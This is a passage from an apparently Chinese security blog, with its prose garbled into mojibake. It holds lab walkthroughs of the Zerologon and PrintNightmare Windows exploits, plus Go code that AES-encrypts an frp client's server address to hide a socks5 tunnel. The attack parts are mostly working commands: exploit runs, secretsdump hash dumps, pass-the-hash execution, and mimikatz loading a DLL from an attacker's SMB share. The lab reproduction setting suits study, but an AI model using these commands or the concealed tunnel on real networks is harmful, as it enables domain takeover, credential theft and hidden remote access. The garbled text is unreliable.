<p>å¦‚æ­¤å¥½ç”¨çš„æ¼æ´ï¼Œæ€ä¹ˆèƒ½æ²¡æœ‰æˆ‘ï¼Ÿæ²¡æœ‰å®é™…ç¯å¢ƒï¼Œå°±ç”¨æœ¬åœ°å¤ç°8ï¼Œè·¨èµ·ä¸ªå°çŒ«è„¸.jpg</p>
<h2 id="0x02-å·¥å…·å‡†å¤‡"><a class="header-anchor" href="#0x02-å·¥å…·å‡†å¤‡">Â¶</a>0x02 å·¥å…·å‡†å¤‡</h2>
<p>ä¸‹è½½å¦‚ä¸‹å·¥å…·</p>
<blockquote>
<p><a href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a><br>
<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a><br>
<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
</blockquote>
<p>python3å®‰è£…æœ€æ–°ç‰ˆimpacket</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> impacket-master</span><br><span class="line">pip3 install .</span><br></pre></td></tr></tbody></table></figure>
<h2 id="0x03-å¤ç°"><a class="header-anchor" href="#0x03-å¤ç°">Â¶</a>0x03 å¤ç°</h2>
<div class="note info"><p>é˜…è¯»æœ¬ç¯‡æ–‡ç« èƒ½äº†è§£åˆ°ï¼šZerologon, åŸŸæ¸—é€</p></div>
<span id="more"></span>
<p>ä¿©å·¥å…·ï¼Œå…·ä½“å•¥åŒºåˆ«ç­‰ä¸‹è¯´</p>
<h3 id="py"><a class="header-anchor" href="#py">Â¶</a>py</h3>
<ol>
<li>exploit</li>
</ol>
<figure class="highlight cmd"><table><tbody><tr><td class="code"><pre><span class="line">cve-<span class="number">2020</span>-<span class="number">1472</span>-exploit.py WIN-<span class="number">4</span>MRAELMUJKS <span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">118</span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="py_exploit.png" alt="py_exploit"></p>
<p>æ­¤æ”»å‡»å·²å°†<code>åŸŸæ§</code>æœºå™¨ç”¨æˆ·å¯†ç ç½®ç©ºï¼Œå³<code>31d6cfe0d16ae931b73c59d7e0c089c0</code></p>
<ol start="2">
<li>dumpHash</li>
</ol>
<figure class="highlight cmd"><table><tbody><tr><td class="code"><pre><span class="line">python3 secretsdump.py -no-pass -just-dc red.com/WIN-<span class="number">4</span>MRAELMUJKS$@<span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">118</span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="py_dumpHash.png" alt="py_dumpHash"></p>
<figure class="highlight cmd"><figcaption><span>ä»…dump administrator hash</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">python3 secretsdump.py red.com/WIN-<span class="number">4</span>MRAELMUJKS$@WIN-<span class="number">4</span>MRAELMUJKS -dc-ip <span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">118</span> -just-dc-user red\administrator -hashes <span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0</span><br></pre></td></tr></tbody></table></figure>
<p><img src="py_dumpAdminHash.png" alt="py_dumpAdminHash"></p>
<ol start="3">
<li>æ‰§è¡Œå‘½ä»¤</li>
</ol>
<figure class="highlight python"><figcaption><span>atexec.py</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">Python3 atexec.py -hashes :7ecfffxxxx548187607a14bad0f88bb1 red/administrator@<span class="number">192.168</span><span class="number">.2</span><span class="number">.118</span> <span class="string">"ipconfig"</span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="cmd_atexec.png" alt="cmd_atexec"></p>
<figure class="highlight python"><figcaption><span>wmiexec</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">Python3 wmiexec.py red.com/administrator@<span class="number">192.168</span><span class="number">.2</span><span class="number">.118</span> -hashes :7ecfffxxxx548187607a14bad0f88bb1</span><br></pre></td></tr></tbody></table></figure>
<p><img src="cmd_wmiexec.png" alt="cmd_wmiexec"></p>
<ol start="3">
<li>restore</li>
</ol>
<figure class="highlight cmd"><table><tbody><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br><span class="line">get system.save</span><br><span class="line">get sam.save</span><br><span class="line">get security.save</span><br><span class="line"><span class="built_in">del</span> system.save</span><br><span class="line"><span class="built_in">del</span> sam.save</span><br><span class="line"><span class="built_in">del</span> security.save</span><br></pre></td></tr></tbody></table></figure>
<p><img src="cmd_regOut.png" alt="cmd_regOut"></p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">Python3 secretsdump.py -sam sam.save -system system.save -security security.save local</span><br></pre></td></tr></tbody></table></figure>
<p><img src="cmd_regDumpHash.png" alt="cmd_regDumpHash"></p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">python3 restorepassword.py red.com/WIN-4MRAELMUJKS@WIN-4MRAELMUJKS -target-ip <span class="number">192.168</span><span class="number">.2</span><span class="number">.118</span> -hexpass 81e29601938c978794d6df7a8d1e7b2d6a8f3f6364eaee355ce49bd8cd2a061051a10ba0492c17fca257ef856ce91f63242d63e6700186fc16d40b873e01b91886279f6c9744e46e7ece0bec87e9ce1d3c857805f5f56b54728807e94e5b904450661b518a7bb7798d8b7f9e8f909b674c216f6bbd1810bfe75150254ebb37e3f1785547bace30c84772ae86dacadeb89a7660ad41740214ffc6d68fee6eb069d916f35172c1c56f8c424c3aef6a316c14f92ad5b8ff76f22e1e3c5dc4f3dda4f4ee984ec94dd5d05396914a790a2061afe063bb8f60dad3ff44886b043d5f1e7c8b9e51ad2b1c7391e142a6e9111add</span><br></pre></td></tr></tbody></table></figure>
<p><img src="py_restore.png" alt="py_restore.png"></p>
<h3 id="mimikatz"><a class="header-anchor" href="#mimikatz">Â¶</a>mimikatz</h3>
<ol>
<li>POC</li>
</ol>
<figure class="highlight cmd"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function">lsadump::<span class="title">zerologon</span> /<span class="title">target:WIN</span>-4<span class="title">MRAELMUJKS</span> /<span class="title">account:WIN</span>-4<span class="title">MRAELMUJKS</span>$</span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="mimikatz_poc.png" alt="mimikatz_poc.png"></p>
<ol start="2">
<li>exploit</li>
</ol>
<figure class="highlight cmd"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function">lsadump::<span class="title">zerologon</span> /<span class="title">target:WIN</span>-4<span class="title">MRAELMUJKS</span> /<span class="title">account:WIN</span>-4<span class="title">MRAELMUJKS</span>$ /<span class="title">exploit</span></span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="mimikatz_exploit.png" alt="mimikatz_exploit.png"></p>
<ol start="3">
<li>dumpHash</li>
</ol>
<figure class="highlight cmd"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function">lsadump::<span class="title">dcsync</span> /<span class="title">domain:red</span>.<span class="title">com</span> /<span class="title">dc:WIN</span>-4<span class="title">MRAELMUJKS</span> /<span class="title">user:administrator</span> /<span class="title">authuser:WIN</span>-4<span class="title">MRAELMUJKS</span>$ /<span class="title">authdomain:red</span> /<span class="title">authpassword</span>:"" /<span class="title">authntlm</span></span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="mimikatz_dumpHash.png" alt="mimikatz_dumpHash.png"></p>
<ol start="4">
<li>restore</li>
</ol>
<figure class="highlight cmd"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function">lsadump::<span class="title">postzerologon</span> /<span class="title">target:red</span>.<span class="title">com</span> /<span class="title">account:WIN</span>-4<span class="title">MRAELMUJKS</span>$</span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="mimikatz_restore.png" alt="mimikatz_restore.png"></p>
<p>æ¢å¤å¤±è´¥ï¼Œä¸çŸ¥åŸå› ï¼Œæ¢å¤è¿˜æ˜¯ç”¨ä¸Šé¢çš„æ–¹æ³•å§</p>
<h2 id="0x04-æ€»ç»“"><a class="header-anchor" href="#0x04-æ€»ç»“">Â¶</a>0x04 æ€»ç»“</h2>
<p><img src="mimikatz_RPC.png" alt="mimikatz_RPC.png"></p>
<p>ä½œè€…è¯´ä½¿ç”¨<code>direct RPC</code>ï¼Œå³<code>rpc</code>åè®®ï¼Œ135ç«¯å£ã€‚è€Œ<code>py</code>æ—¢éœ€è¦<code>smb</code>åè®®ä¹Ÿéœ€è¦<code>RPC</code>ï¼Œå³445å’Œ135</p>
<p>æŸ¥çœ‹ç½‘ç»œè¿æ¥å¯çœ‹åˆ°åŒºåˆ«</p>
<p><img src="py_port.png" alt="py_port.png"></p>
<p><img src="mimikatz_port.png" alt="mimikatz_port.png"></p>
<p><code>py</code>ä¾èµ–445ï¼Œæ‰€ä»¥445è¢«ç¦äº†å°±ç”¨<code>mimikatz</code>å§</p>
<h2 id="0x05-å‚è€ƒèµ„æ–™"><a class="header-anchor" href="#0x05-å‚è€ƒèµ„æ–™">Â¶</a>0x05 å‚è€ƒèµ„æ–™</h2>
<p><a href="https://www.anquanke.com/post/id/219374">https://www.anquanke.com/post/id/219374</a><br>
<a href="https://www.t00ls.net/viewthread.php?tid=58268">https://www.t00ls.net/viewthread.php?tid=58268</a></p>
]]></content>
      <tags>
        <tag>CVE</tag>
        <tag>å¤ç°</tag>
        <tag>åŸŸæ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-1675 - printSpoolerå¤ç°</title>
    <url>/2021/07/28/CVE-2021-1675-printSpooler%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="æ¼æ´ç®€ä»‹"><a class="header-anchor" href="#æ¼æ´ç®€ä»‹">Â¶</a>æ¼æ´ç®€ä»‹</h2>
<h3 id="CVE-2021-1675"><a class="header-anchor" href="#CVE-2021-1675">Â¶</a>CVE-2021-1675</h3>
<p>Print Spooleræ˜¯Windowsç³»ç»Ÿä¸­ç®¡ç†æ‰“å°äº‹åŠ¡çš„æœåŠ¡ï¼Œç”¨äºç®¡ç†æ‰€æœ‰æœ¬åœ°å’Œç½‘ç»œæ‰“å°é˜Ÿåˆ—å¹¶æ§åˆ¶æ‰€æœ‰æ‰“å°å·¥ä½œã€‚Windowsç³»ç»Ÿé»˜è®¤å¼€å¯è¯¥æœåŠ¡ï¼Œæ”»å‡»è€…å¯ç»•è¿‡RPCAddPrintDriverçš„èº«ä»½éªŒè¯ï¼Œç›´æ¥åœ¨æ‰“å°æœåŠ¡å™¨ä¸­å®‰è£…æ¶æ„é©±åŠ¨ç¨‹åºã€‚æ™®é€šç”¨æˆ·å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´æå‡è‡³ç®¡ç†å‘˜æƒé™ã€‚åœ¨åŸŸç¯å¢ƒä¸‹ï¼ŒåŸŸç”¨æˆ·å¯ä»¥è¿œç¨‹åˆ©ç”¨è¯¥æ¼æ´ä»¥SYSTEMæƒé™åœ¨åŸŸæ§åˆ¶å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œè·å¾—æ•´ä¸ªåŸŸçš„æ§åˆ¶æƒã€‚</p>
<h3 id="CVE-2021-34527"><a class="header-anchor" href="#CVE-2021-34527">Â¶</a>CVE-2021-34527</h3>
<p>34527çš„æ¼æ´åŸç†ä¸1675ä¸€è‡´ï¼Œä½†å› ä¸ºgithubä¸Šå‘å¸ƒçš„EXPå¯ä»¥ç»•è¿‡å¾®è½¯åœ¨6æœˆå®‰å…¨è¡¥ä¸æ›´æ–°ä¸­å‘å¸ƒçš„1675çš„ä¿®å¤ç¨‹åºã€‚æ‰€ä»¥åœ¨7æœˆ2æ—¥ï¼Œå¾®è½¯å®˜æ–¹é’ˆå¯¹å…¬å¼€çš„EXPå‘å¸ƒäº†CVE-2021-34527çš„æ¼æ´å…¬å‘Šï¼Œå¹¶æä¾›ä¸´æ—¶è§£å†³æ–¹æ¡ˆï¼Œä½†ç›®å‰æš‚æœªå‘å¸ƒä¿®å¤è¡¥ä¸ï¼Œæ­¤æ¼æ´ä»å¤„äº0dayçŠ¶æ€ã€‚</p>
<h3 id="æ¼æ´æ—¶é—´çº¿"><a class="header-anchor" href="#æ¼æ´æ—¶é—´çº¿">Â¶</a>æ¼æ´æ—¶é—´çº¿</h3>
<p>2021-06-09 å¾®è½¯å‘å¸ƒæœˆåº¦å®‰å…¨è¡¥ä¸ï¼šé€šå‘Šå®šä¹‰CVE-2021-1675ä¸ºæœ¬åœ°ææƒæ¼æ´<br>
2021-06-21 å¾®è½¯æ›´æ–°é€šå‘Šï¼šå°†CVE-2021-1675æ”¹ä¸ºè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´<br>
2021-07-02 å¾®è½¯ç´§æ€¥å‘å¸ƒCVE-2021-34527é€šå‘Šï¼ˆæœªå‘å¸ƒè¡¥ä¸ï¼‰</p>
<h3 id="å½±å“ç‰ˆæœ¬"><a class="header-anchor" href="#å½±å“ç‰ˆæœ¬">Â¶</a>å½±å“ç‰ˆæœ¬</h3>
<div class="note info"><p>é˜…è¯»æœ¬ç¯‡æ–‡ç« èƒ½äº†è§£åˆ°ï¼šprintSpooler, 2008, 2012, RCE</p></div>
<span id="more"></span>
<p>Windows Server 2012 R2 (Server Core installation)<br>
Windows Server 2012 R2<br>
Windows Server 2012 (Server Core installation)<br>
Windows Server 2012<br>
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)<br>
Windows Server 2008 R2 for x64-based Systems Service Pack 1<br>
Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)<br>
Windows Server 2008 for x64-based Systems Service Pack 2<br>
Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)<br>
Windows Server 2008 for 32-bit Systems Service Pack 2<br>
Windows RT 8.1<br>
Windows 8.1 for x64-based systems<br>
Windows 8.1 for 32-bit systems<br>
Windows 7 for x64-based Systems Service Pack 1<br>
Windows 7 for 32-bit Systems Service Pack 1<br>
Windows Server 2016  (Server Core installation)<br>
Windows Server 2016<br>
Windows 10 Version 1607 for x64-based Systems<br>
Windows 10 Version 1607 for 32-bit Systems<br>
Windows 10 for x64-based Systems<br>
Windows 10 for 32-bit Systems<br>
Windows Server, version 20H2 (Server Core Installation)<br>
Windows 10 Version 20H2 for ARM64-based Systems<br>
Windows 10 Version 20H2 for 32-bit Systems<br>
Windows 10 Version 20H2 for x64-based Systems<br>
Windows Server, version 2004 (Server Core installation)<br>
Windows 10 Version 2004 for x64-based Systems<br>
Windows 10 Version 2004 for ARM64-based Systems<br>
Windows 10 Version 2004 for 32-bit Systems<br>
Windows 10 Version 21H1 for 32-bit Systems<br>
Windows 10 Version 21H1 for ARM64-based Systems<br>
Windows 10 Version 21H1 for x64-based Systems<br>
Windows Server, version 1909 (Server Core installation)<br>
Windows 10 Version 1909 for ARM64-based Systems<br>
Windows 10 Version 1909 for x64-based Systems<br>
Windows 10 Version 1909 for 32-bit Systems<br>
Windows Server 2019  (Server Core installation)<br>
Windows Server 2019<br>
Windows 10 Version 1809 for ARM64-based Systems<br>
Windows 10 Version 1809 for x64-based Systems<br>
Windows 10 Version 1809 for 32-bit Systems</p>
<h2 id="å¤ç°"><a class="header-anchor" href="#å¤ç°">Â¶</a>å¤ç°</h2>
<p>è¯¥æ¼æ´å¯å®ç°<strong>æœ¬åœ°ææƒ</strong>å’Œ<strong>RCE</strong><br>
æµ‹è¯•è„šæœ¬ï¼ˆ<code>ps1</code>ï¼‰ï¼š</p>
<blockquote>
<p><a href="https://github.com/calebstewart/CVE-2021-1675.git">https://github.com/calebstewart/CVE-2021-1675.git</a></p>
</blockquote>
<h3 id="1-æ£€æµ‹"><a class="header-anchor" href="#1-æ£€æµ‹">Â¶</a>1. æ£€æµ‹</h3>
<p>ä½¿ç”¨<code>Impacket</code>å¥—ä»¶æ£€æµ‹</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">python3 rpcdump.py @<span class="number">192.168</span><span class="number">.2</span><span class="number">.118</span> | findstr MS-RPRN</span><br></pre></td></tr></tbody></table></figure>
<p>è‹¥å­˜åœ¨æ¼æ´ï¼š</p>
<blockquote>
<p>Protocol: [MS-RPRN]: Print System Remote Protocol</p>
</blockquote>
<p><img src="detect.png" alt="detect"></p>
<h3 id="2-æœ¬åœ°ææƒæµ‹è¯•ç»“æœ"><a class="header-anchor" href="#2-æœ¬åœ°ææƒæµ‹è¯•ç»“æœ">Â¶</a>2. <strong>æœ¬åœ°ææƒ</strong>æµ‹è¯•ç»“æœ</h3>
<ul>
<li>2008</li>
</ul>
<p>åŸŸç¯å¢ƒå’Œæœ¬åœ°å‡æµ‹è¯•å¤±è´¥<br>
<img src="2008.png" alt="2008"></p>
<ul>
<li>2012</li>
</ul>
<p>æ™®é€šç”¨æˆ·ï¼Œææƒå¤±è´¥<br>
<img src="2012_fail.png" alt="2012_fail"></p>
<p>ç®¡ç†å‘˜ï¼ŒææƒæˆåŠŸ<br>
<img src="2012_success.png" alt="2012_success"></p>
<p>è¯¥è„šæœ¬å®Œæˆææƒä¼šç›´æ¥åˆ›å»ºä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·ï¼Œå¯ä»¥çœ‹åˆ°2012æˆåŠŸåœ¨ç®¡ç†å‘˜æƒé™ä¸‹ï¼Œå¹¶æ— æ„ä¹‰</p>
<h3 id="3-RCEæµ‹è¯•ç»“æœ"><a class="header-anchor" href="#3-RCEæµ‹è¯•ç»“æœ">Â¶</a>3. <strong>RCE</strong>æµ‹è¯•ç»“æœ</h3>
<p>å…ˆå¼€å¯<code>smb</code>åŒ¿åè®¿é—®ï¼Œä½¿ç”¨<code>3gstudent</code>çš„è„šæœ¬å¼€å¯</p>
<blockquote>
<p><a href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer">https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer</a></p>
</blockquote>
<p><img src="3gstudent.png" alt="3gstudent"></p>
<p>å¼€å¯æˆåŠŸï¼Œç”¨ç›®æ ‡æœº2012è®¿é—®<code>\\192.168.2.50\smb\</code>æ­£å¸¸</p>
<ul>
<li>ä½¿ç”¨<code>cube0x0</code>è„šæœ¬æ”»å‡»</li>
</ul>
<blockquote>
<p><a href="https://github.com/cube0x0/CVE-2021-1675">https://github.com/cube0x0/CVE-2021-1675</a></p>
</blockquote>
<p><img src="cube0x0_failed.png" alt="cube0x0_failed"></p>
<p>åˆ©ç”¨å¤±è´¥ï¼ŒæŸ¥è¯¢é”™è¯¯åŸå› ï¼Œå‘ç°ä½œè€…è¯´è¦ä½¿ç”¨ä»–é­”æ”¹çš„<code>impacket</code></p>
<blockquote>
<p><a href="https://github.com/cube0x0/CVE-2021-1675/issues/48">https://github.com/cube0x0/CVE-2021-1675/issues/48</a></p>
</blockquote>
<p>é‡è£…ï¼Œå†æ¬¡æ”»å‡»ï¼Œè¿˜æ˜¯å¤±è´¥<br>
<img src="cube0x0_failed2.png" alt="cube0x0_failed2"></p>
<ul>
<li>ä½¿ç”¨<code>mimikatz</code>æ”»å‡»</li>
</ul>
<figure class="highlight cmd"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function">misc::<span class="title">printnightmare</span> /<span class="title">server</span>:192.168.2.104 /<span class="title">library</span>:\\192.168.2.50\<span class="title">smb</span>\<span class="title">server.dll</span></span></span><br><span class="line"><span class="function"><span class="title">misc</span>::<span class="title">printnightmare</span> /<span class="title">server</span>:192.168.2.104 /<span class="title">authuser:test</span> /<span class="title">authpassword</span>:1<span class="title">qaz</span>@<span class="title">WSX</span> /<span class="title">library</span>:\\192.168.2.50\<span class="title">smb</span>\<span class="title">server.dll</span></span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="mimikatz.png" alt="mimikatz"></p>
<p>å‡æç¤º<code>0x5 access denied</code>ï¼Œä½†å®é™…ä¸Šç›®æ ‡è®¿é—®<code>dll</code>æ˜¯æ­£å¸¸çš„</p>
<h2 id="æ€»ç»“"><a class="header-anchor" href="#æ€»ç»“">Â¶</a>æ€»ç»“</h2>
<p>è¯¥æ¼æ´è™½ç„¶æ˜¾ç¤ºä¸ºé€šæ€ï¼Œä½†å®æµ‹ä½ç‰ˆæœ¬æˆåŠŸç‡è¾ƒä½ï¼Œé«˜ç‰ˆæœ¬æœªæµ‹ï¼Œæ®è¯´èƒ½æˆåŠŸ<br>
å‘ç‚¹è¾ƒå¤šï¼ŒåŸºæœ¬éƒ½æ˜¯<code>smb</code>åŒ¿åè®¿é—®ä¸åˆ°é€ æˆ<br>
é€šç”¨æ€§å¹¶ä¸æ˜¯å¾ˆå¼ºï¼Œé’ˆå¯¹é«˜ç‰ˆæœ¬<code>windows</code>ï¼ˆ2016ç­‰ï¼‰æˆåŠŸç‡æ‰ä¼šé«˜ä¸€äº›ï¼Œ<br>
ææƒè¾ƒä¸ºå®ç”¨ï¼Œ<code>RCE</code>ç”¨äºåŸŸæ§æ‰èƒ½å‘æŒ¥æœ€å¤§æ•ˆç›Š</p>
<h2 id="å‚è€ƒé“¾æ¥"><a class="header-anchor" href="#å‚è€ƒé“¾æ¥">Â¶</a>å‚è€ƒé“¾æ¥</h2>
<p><a href="https://www.t00ls.net/viewthread.php?tid=62007">https://www.t00ls.net/viewthread.php?tid=62007</a><br>
<a href="https://www.t00ls.net/viewthread.php?tid=61657">https://www.t00ls.net/viewthread.php?tid=61657</a><br>
<a href="https://www.t00ls.net/thread-62109-1-1.html">https://www.t00ls.net/thread-62109-1-1.html</a></p>
]]></content>
      <tags>
        <tag>CVE</tag>
        <tag>å¤ç°</tag>
        <tag>ææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>Frpæ”¹é€  - å‚æ•°ç‰ˆ+AESåŠ å¯†</title>
    <url>/2022/01/11/Frp%E6%94%B9%E9%80%A0-%E5%8F%82%E6%95%B0%E7%89%88-AES%E5%8A%A0%E5%AF%86/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">Â¶</a>å‰è¨€</h2>
<p>å‚æ•°ç‰ˆå·²ç»æœ‰å¾ˆå¤šå¤§ä½¬æ”¹é€ è¿‡äº†ï¼Œå› ä¸ºæœ€è¿‘æœ‰éœ€æ±‚éœ€è¦æŠŠå‚æ•°åŠ å¯†åŒ–ï¼Œç½‘ä¸Šæ²¡æ‰¾åˆ°ç°æˆçš„ï¼Œæ‰€ä»¥æ‰‹åŠ¨æ”¹é€ ï¼Œé¡ºä¾¿å­¦ä¸€ç‚¹<code>go</code>è¯­è¨€ ğŸ˜…</p>
<p>åŸºäº<code>uknowsec</code>å¤§ä½¬çš„æ–‡ç«  <a href="https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html">FRPæ”¹é€ è®¡åˆ’</a>ï¼Œå®ç°ä½œè€…è¯´çš„ï¼š</p>
<blockquote>
<p>æ‰€ä»¥å¯ä»¥ç›´æ¥åŠ ä¸€äº›åŠ å¯†å•¥çš„ï¼Œ-tå‚æ•°ä¼ å…¥ipåŠ å¯†åçš„åœ°å€ï¼Œç„¶ååœ¨æºç é‡ŒåŠ ä¸€ä¸ªè§£å¯†çš„æ­¥éª¤å³å¯ã€‚</p>
</blockquote>
<p>å¦å¤–ï¼Œä¸ªäººè§‰å¾—åªåŠ å¯†<code>ip</code>ä¸å¤Ÿéšè”½ï¼Œæ‰€ä»¥è¿åŒ<code>port</code>ä¸€èµ·è¿›è¡Œ<code>AES</code>åŠ å¯†</p>
<h2 id="æ”¹é€ "><a class="header-anchor" href="#æ”¹é€ ">Â¶</a>æ”¹é€ </h2>
<p>åªéœ€è¦ä¿®æ”¹<code>cmd/frpc/sub/root.go</code>å³å¯</p>
<span id="more"></span>
<h3 id="1-åˆ›å»ºAESå‡½æ•°"><a class="header-anchor" href="#1-åˆ›å»ºAESå‡½æ•°">Â¶</a>1. åˆ›å»º<code>AES</code>å‡½æ•°</h3>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PKCS7Padding</span><span class="params">(ciphertext []<span class="type">byte</span>, blockSize <span class="type">int</span>)</span></span> []<span class="type">byte</span> {</span><br><span class="line">	padding := blockSize - <span class="built_in">len</span>(ciphertext)%blockSize</span><br><span class="line">	padtext := bytes.Repeat([]<span class="type">byte</span>{<span class="type">byte</span>(padding)}, padding)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">append</span>(ciphertext, padtext...)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PKCS7UnPadding</span><span class="params">(origData []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> {</span><br><span class="line">	length := <span class="built_in">len</span>(origData)</span><br><span class="line">	unpadding := <span class="type">int</span>(origData[length<span class="number">-1</span>])</span><br><span class="line">	<span class="keyword">return</span> origData[:(length - unpadding)]</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AesEncrypt</span><span class="params">(origData, key []<span class="type">byte</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) {</span><br><span class="line">	block, err := aes.NewCipher(key)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	}</span><br><span class="line">	blockSize := block.BlockSize()</span><br><span class="line">	origData = PKCS7Padding(origData, blockSize)</span><br><span class="line">	blockMode := cipher.NewCBCEncrypter(block, key[:blockSize])</span><br><span class="line">	crypted := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(origData))</span><br><span class="line">	blockMode.CryptBlocks(crypted, origData)</span><br><span class="line">	<span class="keyword">return</span> crypted, <span class="literal">nil</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AesDecrypt</span><span class="params">(crypted, key []<span class="type">byte</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) {</span><br><span class="line">	block, err := aes.NewCipher(key)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	}</span><br><span class="line">	blockSize := block.BlockSize()</span><br><span class="line">	blockMode := cipher.NewCBCDecrypter(block, key[:blockSize])</span><br><span class="line">	origData := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(crypted))</span><br><span class="line">	blockMode.CryptBlocks(origData, crypted)</span><br><span class="line">	origData = PKCS7UnPadding(origData)</span><br><span class="line">	<span class="keyword">return</span> origData, <span class="literal">nil</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="2-åˆå§‹åŒ–ä¸­å®šä¹‰ä¼ å‚"><a class="header-anchor" href="#2-åˆå§‹åŒ–ä¸­å®šä¹‰ä¼ å‚">Â¶</a>2. åˆå§‹åŒ–ä¸­å®šä¹‰ä¼ å‚</h3>
<p>åªéœ€ä¼ ä¸€ä¸ªå‚æ•°ï¼Œé‡Œé¢åŒ…å«<code>ip</code>å’Œ<code>port</code>å³å¯</p>
<figure class="highlight diff"><table><tbody><tr><td class="code"><pre><span class="line">func init() {</span><br><span class="line">	rootCmd.PersistentFlags().StringVarP(&amp;cfgFile, "config", "c", "./frpc.ini", "config file of frpc")</span><br><span class="line">	rootCmd.PersistentFlags().BoolVarP(&amp;showVersion, "version", "v", false, "version of frpc")</span><br><span class="line"><span class="addition">+	rootCmd.PersistentFlags().StringVarP(&amp;ipPort, "ipPort", "t", "", "ip port")</span></span><br><span class="line">	kcpDoneCh = make(chan struct{})</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="3-æ–°å¢å‡½æ•°"><a class="header-anchor" href="#3-æ–°å¢å‡½æ•°">Â¶</a>3. æ–°å¢å‡½æ•°</h3>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getFileContent</span><span class="params">(ipPort <span class="type">string</span>)</span></span> {</span><br><span class="line">	AesKey := []<span class="type">byte</span>(<span class="string">"1qaz2wsx3edc4rfv"</span>)  <span class="comment">// å¯¹ç§°ç§˜é’¥é•¿åº¦å¿…é¡»æ˜¯16çš„å€æ•°</span></span><br><span class="line">	encrypted, _ := base64.StdEncoding.DecodeString(ipPort)</span><br><span class="line">	origin, err := AesDecrypt(encrypted, AesKey)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	}</span><br><span class="line">	arr := strings.Fields(<span class="type">string</span>(origin))</span><br><span class="line">	ip := arr[<span class="number">0</span>]</span><br><span class="line">	port := arr[<span class="number">1</span>]</span><br><span class="line">	<span class="keyword">var</span> content <span class="type">string</span> = <span class="string">`[common]</span></span><br><span class="line"><span class="string">    server_addr = `</span> + ip + <span class="string">`</span></span><br><span class="line"><span class="string">    server_port = `</span> + port + <span class="string">`</span></span><br><span class="line"><span class="string">	tls_enable = true</span></span><br><span class="line"><span class="string">    token = socks</span></span><br><span class="line"><span class="string">	[socks]</span></span><br><span class="line"><span class="string">	type = tcp</span></span><br><span class="line"><span class="string">	remote_port = 1800</span></span><br><span class="line"><span class="string">	plugin = socks5</span></span><br><span class="line"><span class="string">	`</span></span><br><span class="line">	fileContent = content</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
